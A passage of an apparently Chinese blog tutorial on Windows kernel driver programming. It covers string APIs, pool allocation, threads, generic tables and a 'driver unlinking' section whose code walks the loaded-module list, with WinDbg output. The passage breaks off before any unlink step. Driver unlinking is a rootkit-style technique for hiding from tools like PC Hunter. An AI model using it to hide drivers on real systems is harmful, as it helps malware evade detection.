)</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">UNICODE_STRING unName = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">RtlInitUnicodeString(&amp;unName, <span class=\"string\">L&quot;www&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">OBJECT_ATTRIBUTES obj = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">obj.ObjectName = &amp;unName; </span><br><span class=\"line\"><span class=\"comment\">// \tInitializeObjectAttributes</span></span><br><span class=\"line\">    </span><br><span class=\"line\">HANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">NtOpenProcess(&amp;hProcess,PROCESS_ALL_ACCESS,&amp;obj,<span class=\"literal\">NULL</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UNICODE_STRING unName = &#123;0&#125;;</span><br><span class=\"line\">PWCH x = L&quot;xxxx&quot;;</span><br><span class=\"line\">RtlInitUnicodeString(&amp;unName, x);</span><br><span class=\"line\">DbgPrintEx(77,0,&quot;%x %x&quot;,x,unName.Buffer);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char* xxx = &quot;1111&quot;;</span><br><span class=\"line\">UNICODE_STRING unName = &#123; 0 &#125;;</span><br><span class=\"line\">STRING str = &#123; 0 &#125;;</span><br><span class=\"line\">RtlInitString(&amp;str, xxx);</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS status = RtlAnsiStringToUnicodeString(&amp;unName, &amp;str, TRUE);</span><br><span class=\"line\">DbgPrintEx(77, 0, &quot;%x&quot;, status);</span><br><span class=\"line\"></span><br><span class=\"line\">if (NT_SUCCESS(status))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrintEx(77, 0, &quot;%x %x&quot;, str.Buffer, unName.Buffer);</span><br><span class=\"line\">\tRtlFreeUnicodeString(&amp;unName);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;ntstrsafe.h&gt;</span><br><span class=\"line\">char bb[1000] = &#123; 0 &#125;;</span><br><span class=\"line\">RtlStringCbPrintfA(bb, 1000, &quot;%d  %s&quot;, 10, &quot;ssss&quot;);</span><br><span class=\"line\">DbgPrintEx(77, 0, &quot;%s&quot;, bb);</span><br><span class=\"line\"></span><br><span class=\"line\">RtlStringCbPrintfW</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RtiInitString 初始化多字节ascii</span><br><span class=\"line\">RtlInitUnicodeString 初始化宽字符</span><br><span class=\"line\">RtlFreeUnicodeString释放uncode学符串</span><br><span class=\"line\">RtlStringCbPrintfA格式化输出――记得引用#include &lt;ntstrsafe.h&gt;</span><br><span class=\"line\">RtlCompareUnicodeString(a, b, TRUE);  字符串比较</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 申请内存</span><br><span class=\"line\">ExAllocatePool()</span><br><span class=\"line\"></span><br><span class=\"line\">ExAllocatePool(NonPagedPool, size);  // 可执行</span><br><span class=\"line\">ExAllocatePoolWithTag(NonPagedPool, size,&#x27;111&#x27;);</span><br><span class=\"line\">!pte Address</span><br><span class=\"line\"></span><br><span class=\"line\">ExFreePool(mem);</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建线程\"><a class=\"markdownIt-Anchor\" href=\"#创建线程\">#</a> 创建线程</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void work(PVOID StartContext)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">HANDLE hThread = NULL;</span><br><span class=\"line\">NTSTATUS status = PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, work, NULL);</span><br><span class=\"line\">if (NT_SUCCESS(status))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tZwClose(hThread);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"驱动-2\"><a class=\"markdownIt-Anchor\" href=\"#驱动-2\">#</a> 驱动</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dt _LIST_ENTRY</span><br><span class=\"line\">ntdll!_LIST_ENTRY</span><br><span class=\"line\">   +0x000 Flink            : Ptr32 _LIST_ENTRY</span><br><span class=\"line\">   +0x004 Blink            : Ptr32 _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">0: kd&gt; dt _SINGLE_LIST_ENTRY</span><br><span class=\"line\">ntdll!_SINGLE_LIST_ENTRY</span><br><span class=\"line\">   +0x000 Next             : Ptr32 _SINGLE_LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">InitializeListHead();  // 链表定义在局部变量的时候需要初始化，防止垃圾数据，全局变量默认初始化都是0</span><br><span class=\"line\">IsListEmpty();</span><br><span class=\"line\">InsertHeadList();</span><br><span class=\"line\">InsertTailList();</span><br><span class=\"line\">RemoveHeadList();</span><br><span class=\"line\">RemoveTailList();</span><br><span class=\"line\">RemoveEntryList();</span><br><span class=\"line\">CONTAINING_RECORD();</span><br><span class=\"line\">\t</span><br><span class=\"line\">#include &lt;ntifs.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">RTL_GENERIC_TABLE gTABLE = &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _AAA</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint id;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">&#125;AAA, * PAAA;</span><br><span class=\"line\"></span><br><span class=\"line\">void DRIVERUNLOAD(PDRIVER_OBJECT DriverObject)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(&quot;unload\\r\\n&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">RTL_GENERIC_COMPARE_RESULTS NTAPI GenericCmp(</span><br><span class=\"line\">\t_In_ struct _RTL_GENERIC_TABLE* Table,</span><br><span class=\"line\">\t_In_ PVOID FirstStruct,</span><br><span class=\"line\">\t_In_ PVOID SecondStruct</span><br><span class=\"line\">)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPAAA  a1 = (PAAA)FirstStruct;</span><br><span class=\"line\">\tPAAA  a2 = (PAAA)SecondStruct;</span><br><span class=\"line\">\tif (a1-&gt;id == a2-&gt;id)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn GenericEqual;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (a1-&gt;id &gt; a2-&gt;id) return GenericGreaterThan;</span><br><span class=\"line\">\treturn GenericLessThan;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">PVOID NTAPI GenericAllocate(</span><br><span class=\"line\">\t_In_ struct _RTL_GENERIC_TABLE* Table,</span><br><span class=\"line\">\t_In_ CLONG ByteSize</span><br><span class=\"line\">)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn ExAllocatePool(NonPagedPool, ByteSize);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">VOID NTAPI GenericFree(</span><br><span class=\"line\">\t_In_ struct _RTL_GENERIC_TABLE* Table,</span><br><span class=\"line\">\t_In_ __drv_freesMem(Mem) _Post_invalid_ PVOID Buffer</span><br><span class=\"line\">)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tExFreePool(Buffer);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tAAA aaa = &#123; 0 &#125;;</span><br><span class=\"line\">\t//DbgBreakPoint();</span><br><span class=\"line\"></span><br><span class=\"line\">\t//InitializeListHead();  // 链表定义在局部变量的时候需要初始化，防止垃圾数据，全局变量默认初始化都是0</span><br><span class=\"line\">\t//IsListEmpty();</span><br><span class=\"line\">\t//InsertHeadList();</span><br><span class=\"line\">\t//InsertTailList();</span><br><span class=\"line\">\t//RemoveHeadList();</span><br><span class=\"line\">\t//RemoveTailList();</span><br><span class=\"line\">\t//RemoveEntryList();</span><br><span class=\"line\">\t//CONTAINING_RECORD();</span><br><span class=\"line\"></span><br><span class=\"line\">\taaa.id = 1;</span><br><span class=\"line\">\taaa.x = 2;</span><br><span class=\"line\">\taaa.y = 3;</span><br><span class=\"line\"></span><br><span class=\"line\">\tAAA node = &#123; 3,2,1 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBOOLEAN newE = FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">\tRtlInitializeGenericTable(&amp;gTABLE, GenericCmp, GenericAllocate, GenericFree, NULL);</span><br><span class=\"line\">\t//RtlInitializeGenericTableAvl();  二叉搜索树</span><br><span class=\"line\">\tRtlInsertElementGenericTable(&amp;gTABLE, &amp;aaa, sizeof(AAA), &amp;newE);   // 用栈插入的数据会申请内存，把栈上的变成堆上的，保证数据不会被释放</span><br><span class=\"line\">\tAAA * xxx = RtlLookupElementGenericTable(&amp;gTABLE, &amp;aaa);</span><br><span class=\"line\">\tint num = RtlNumberGenericTableElements(&amp;gTABLE);</span><br><span class=\"line\">\tRtlDeleteElementGenericTable(&amp;gTABLE, &amp;node);</span><br><span class=\"line\">\tRtlIsGenericTableEmpty(&amp;gTABLE);</span><br><span class=\"line\"></span><br><span class=\"line\">\tAAA* RestartKey = NULL;</span><br><span class=\"line\">\tAAA* xx = 0;</span><br><span class=\"line\">\tif (!RtlIsGenericTableEmpty(&amp;gTABLE))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//遍历</span><br><span class=\"line\">\t\tfor (xx = RtlEnumerateGenericTableWithoutSplaying(&amp;gTABLE, &amp;RestartKey);</span><br><span class=\"line\">\t\t\txx != NULL;</span><br><span class=\"line\">\t\t\txx = RtlEnumerateGenericTableWithoutSplaying(&amp;gTABLE, &amp;RestartKey))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tDbgPrintEx(77, 0, &quot;%x\\r\\n&quot;, xx-&gt;id);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\treturn STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"驱动断链\"><a class=\"markdownIt-Anchor\" href=\"#驱动断链\">#</a> 驱动断链</h3>\n<p>pc hunter 会遍历 driver 和 filesystem 组成内核模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: kd&gt; dt _DRIVER_OBJECT</span><br><span class=\"line\">nt!_DRIVER_OBJECT</span><br><span class=\"line\">   +0x000 Type             : Int2B</span><br><span class=\"line\">   +0x002 Size             : Int2B</span><br><span class=\"line\">   +0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class=\"line\">   +0x008 Flags            : Uint4B</span><br><span class=\"line\">   +0x00c DriverStart      : Ptr32 Void</span><br><span class=\"line\">   +0x010 DriverSize       : Uint4B</span><br><span class=\"line\">   +0x014 DriverSection    : Ptr32 Void</span><br><span class=\"line\">   +0x018 DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class=\"line\">   +0x01c DriverName       : _UNICODE_STRING</span><br><span class=\"line\">   +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class=\"line\">   +0x028 FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class=\"line\">   +0x02c DriverInit       : Ptr32     long </span><br><span class=\"line\">   +0x030 DriverStartIo    : Ptr32     void </span><br><span class=\"line\">   +0x034 DriverUnload     : Ptr32     void </span><br><span class=\"line\">   +0x038 MajorFunction    : [28] Ptr32     long </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/// 遍历所有驱动模块</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class=\"line\">\tLIST_ENTRY InLoadOrderLinks;</span><br><span class=\"line\">\tLIST_ENTRY <span class=\"built_in\">exp</span>;</span><br><span class=\"line\">\tULONG un;</span><br><span class=\"line\">\tULONG NonPagedDebugInfo;</span><br><span class=\"line\">\tULONG DllBase;</span><br><span class=\"line\">\tULONG EntryPoint;</span><br><span class=\"line\">\tULONG SizeOfImage;</span><br><span class=\"line\">\tUNICODE_STRING FullDllName;</span><br><span class=\"line\">\tUNICODE_STRING BaseDllName;</span><br><span class=\"line\">\tULONG Flags;</span><br><span class=\"line\">\tUSHORT LoadCount;</span><br><span class=\"line\">\tUSHORT __Undefined5;</span><br><span class=\"line\">\tULONG  __Undefined6;</span><br><span class=\"line\">\tULONG  CheckSum;</span><br><span class=\"line\">\tULONG  TimeDateStamp;</span><br><span class=\"line\">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DRIVERUNLOAD</span><span class=\"params\">(PDRIVER_OBJECT DriverObject)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;unload\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgBreakPoint();</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;  <span class=\"comment\">// 下一个节点</span></span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (next != pre)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDbgPrintEx(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;%wZ\\r\\n&quot;</span>, &amp;next-&gt;FullDllName);</span><br><span class=\"line\">\t\tnext = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//////////</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt ldr</span><br><span class=\"line\">Local var @ <span class=\"number\">0x8cb309cc</span> Type _KLDR_DATA_TABLE_ENTRY*</span><br><span class=\"line\"><span class=\"number\">0x887d8e50</span> </span><br><span class=\"line\">   +<span class=\"number\">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class=\"number\">0x83f53850</span> - <span class=\"number\">0x880ac730</span> ]</span><br><span class=\"line\">   +<span class=\"number\">0x008</span> <span class=\"built_in\">exp</span>              : _LIST_ENTRY [ <span class=\"number\">0xffffffff</span> - <span class=\"number\">0xffffffff</span> ]</span><br><span class=\"line\">   +<span class=\"number\">0x010</span> un               : <span class=\"number\">0x887d8e68</span></span><br><span class=\"line\">   +<span class=\"number\">0x014</span> NonPagedDebugInfo : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x018</span> DllBase          : <span class=\"number\">0x9609a000</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> EntryPoint       : <span class=\"number\">0x9609e000</span></span><br><span class=\"line\">   +<span class=\"number\">0x020</span> SizeOfImage      : <span class=\"number\">0x6000</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> FullDllName      : _UNICODE_STRING <span class=\"string\">&quot;\\??\\C:\\Users\\shinya\\Desktop\\MyDriver2.sys&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> BaseDllName      : _UNICODE_STRING <span class=\"string\">&quot;MyDriver2.sys&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Flags            : <span class=\"number\">0x49104000</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> LoadCount        : <span class=\"number\">1</span></span><br><span class=\"line\">   +<span class=\"number\">0x03a</span> __Undefined5     : <span class=\"number\">0x86f8</span></span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> __Undefined6     : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x040</span> CheckSum         : <span class=\"number\">0x1d5e</span></span><br><span class=\"line\">   +<span class=\"number\">0x044</span> TimeDateStamp    : <span class=\"number\">0x2010002</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt pDriver</span><br><span class=\"line\">Local var @ <span class=\"number\">0x8cb309e0</span> Type _DRIVER_OBJECT*</span><br><span class=\"line\"><span class=\"number\">0x887dcae8</span> </span><br><span class=\"line\">   +<span class=\"number\">0x000</span> Type             : <span class=\"number\">0</span>n4</span><br><span class=\"line\">   +<span class=\"number\">0x002</span> Size             : <span class=\"number\">0</span>n168</span><br><span class=\"line\">   +<span class=\"number\">0x004</span> DeviceObject     : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x008</span> Flags            : <span class=\"number\">2</span></span><br><span class=\"line\">   +<span class=\"number\">0x00c</span> DriverStart      : <span class=\"number\">0x9609a000</span> Void</span><br><span class=\"line\">   +<span class=\"number\">0x010</span> DriverSize       : <span class=\"number\">0x6000</span></span><br><span class=\"line\">   +<span class=\"number\">0x014</span> DriverSection    : <span class=\"number\">0x887d8e50</span> Void</span><br><span class=\"line\">   +<span class=\"number\">0x018</span> DriverExtension  : <span class=\"number\">0x887dcb90</span> _DRIVER_EXTENSION</span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> DriverName       : _UNICODE_STRING <span class=\"string\">&quot;\\Driver\\MyDriver2&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> HardwareDatabase : <span class=\"number\">0x84175250</span> _UNICODE_STRING <span class=\"string\">&quot;\\REGISTRY\\MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x028</span> FastIoDispatch   : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> DriverInit       : <span class=\"number\">0x9609e000</span>     <span class=\"type\">long</span>  MyDriver2!GsDriverEntry+<span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x030</span> DriverStartIo    : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x034</span> DriverUnload     : (null) </span><br><span class=\"line\">   +<span class=\"number\">0x038</span> MajorFunction    : [<span class=\"number\">28</span>] <span class=\"number\">0x83ebeda3</span>     <span class=\"type\">long</span>  nt!IopInvalidDeviceRequest+<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>: kd&gt; dt PKLDR_DATA_TABLE_ENTRY  <span class=\"number\">0x83f53850</span> </span><br><span class=\"line\">MyDriver2!PKLDR_DATA_TABLE_ENTRY</span><br><span class=\"line\"><span class=\"number\">0x86541c98</span> </span><br><span class=\"line\">   +<span class=\"number\">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class=\"number\">0x86541c20</span> - <span class=\"number\">0x83f53850</span> ]</span><br><span class=\"line\">   +<span class=\"number\">0x008</span> <span class=\"built_in\">exp</span>              : _LIST_ENTRY [ <span class=\"number\">0x83e81544</span> - <span class=\"number\">0x12</span> ]</span><br><span class=\"line\">   +<span class=\"number\">0x010</span> un               : 